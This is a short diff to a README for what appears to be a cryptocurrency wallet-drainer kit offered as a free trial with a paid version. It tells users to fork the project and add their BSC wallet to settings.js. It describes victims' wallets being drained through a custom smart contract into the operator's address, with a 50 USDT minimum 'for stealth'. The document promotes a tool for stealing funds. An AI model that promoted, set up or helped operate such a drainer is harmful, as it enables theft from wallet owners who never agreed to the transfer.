@@ -74,6 +74,9 @@ Fork ---------->  add your bsc wallet to settings.js file  ------> Go to  https:
 
 ### HOW IT WORKS FOR FREE VERSION ###
 
+### REMEMBER THE FREE VERSION IS ONLY MENT TO BE A TRIAL A DEMO ###
+
+
 Wallet gets drained ----> CUSTOM SMART CONTRACT -----> YOUR BSC ADDRESS
 
 !!!!!!!!! This only will work with wallets that have 50 usdt or more for stealth !!!!!!!!!
